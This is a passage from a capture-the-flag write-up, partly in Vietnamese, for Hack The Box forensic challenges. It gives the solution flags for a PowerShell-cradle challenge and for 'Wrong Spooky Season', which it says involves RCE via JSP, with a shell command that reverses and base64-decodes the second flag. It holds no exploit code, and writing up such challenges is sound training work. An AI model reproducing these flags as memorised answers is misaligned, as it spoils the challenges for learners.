flag: `'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}'` `HTB{p0w3rshell_Cr4dles_c4n_g3t_th3_j0b_d0n3}`

## Wrong Spooky Season

![image](https://hackmd.io/_uploads/HJij5po9R.png)

Nó RCE với jsp

```
l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Alien Cradle$ echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
l3mnt2010@ASUSEXPERTBOOK:~/HTB/forensic/Alien Cradle$
```

flag: `HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}`

## TrueSecrets